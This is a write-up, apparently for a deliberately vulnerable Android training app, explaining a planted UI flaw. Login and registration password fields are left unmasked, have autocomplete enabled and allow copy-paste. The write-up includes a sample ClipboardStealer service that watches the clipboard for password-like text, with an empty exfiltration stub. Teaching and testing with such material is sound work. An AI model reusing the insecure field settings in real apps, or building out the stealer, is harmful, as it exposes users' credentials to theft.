# MASWE-0053: Sensitive Data Leaked via the User Interface

The relevant code for this vulnerability can be seen in maswe_0053/LoginActivity.java and RegistryActivity.java.

## The vulnerability consists of:

In both files, the vulnerability is implemented symmetrically.

1. Removing password obfuscation, as well as adding autocomplete and autocorrect flags for the password field in the lines here:
```java
password_field.setInputType(InputType.TYPE_CLASS_TEXT |
        InputType.TYPE_TEXT_FLAG_AUTO_COMPLETE |
        InputType.TYPE_TEXT_FLAG_AUTO_CORRECT);
```
2. Adding the same autocorrect and autocomplete flags for the email field here:
```java
email_field.setInputType(InputType.TYPE_TEXT_FLAG_AUTO_COMPLETE |
        InputType.TYPE_TEXT_FLAG_AUTO_CORRECT);
```

3. Making sure that copy and paste functionalities are enabled for the password field here:
```java
password_field.setCustomSelectionActionModeCallback(null);
```

## The vulnerability can be exploited by:
By enabling copy and paste functionalities, the risk of user credentials being copied and thus safed to the clipboard is introduced. The clipboard can be accessed by any app. Depending on the android version, a service reading the clipboard can either be running in the background (Android 9 and below), must be from an App running in the forground (Android 10) or there can even be a toast notification to the user that the Apps service has read from the clipboard (Android 12) [1]. Nevertheless, this vulnerability is still exploitable on newer android versions, especially since the toast is only sent after the clipboard has been read.
1. An attacker can run this service from any malicious app installed on the device:
```java
public class ClipboardStealer extends Service {
    private ClipboardManager clipboardManager;
    private ClipboardManager.OnPrimaryClipChangedListener listener;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        clipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        
        listener = new ClipboardManager.OnPrimaryClipChangedListener() {
            @Override
            public void onPrimaryClipChanged() {
                // Clipboard content changed!
                stealClipboardData();
            }
        };
        
        clipboardManager.addPrimaryClipChangedListener(listener);
    }
    
    private void stealClipboardData() {
        if (clipboardManager.hasPrimaryClip()) {
            ClipData clip = clipboardManager.getPrimaryClip();
            
            if (clip != null && clip.getItemCount() > 0) {
                CharSequence text = clip.getItemAt(0).getText();
                
                if (text != null) {
                    String clipboardContent = text.toString();
                    
                    // Check if it looks like a password
                    if (looksLikePassword(clipboardContent)) {

                        // Exfiltrate immediately
                        sendToAttacker(clipboardContent);
                    }
                }
            }
        }
    }
    
    private boolean looksLikePassword(String text) {
        // Heuristics for password detection
        return text.length() >= 6 && text.length() <= 100 &&
               text.matches(".*[A-Z].*") && text.matches(".*[a-z].*") && text.matches(".*[0-9].*");
    }
    
    private void sendToAttacker(String password) {
        // Send to remote server
    }
}
```
2. This can give attackers access to any user credentials being copied during login or registration process, which poses a great security threat.

## Interesting links and sources:
- [1] [Android Developer on clipboard vulnerabilities and safe handling](https://developer.android.com/privacy-and-security/risks/secure-clipboard-handling)
- [Paper discussing different Android clipboard attack angles](https://www.researchgate.net/publication/300578051_Attacks_on_Android_Clipboard)
- [GitHub Repository for app that implements clipboard attack in detail](https://github.com/grepx/android-clipboard-security)
- [Guardsquare on the topic of clipboard attacks](https://www.guardsquare.com/mobile-app-security-research-center/malware/clipboard-hijacking)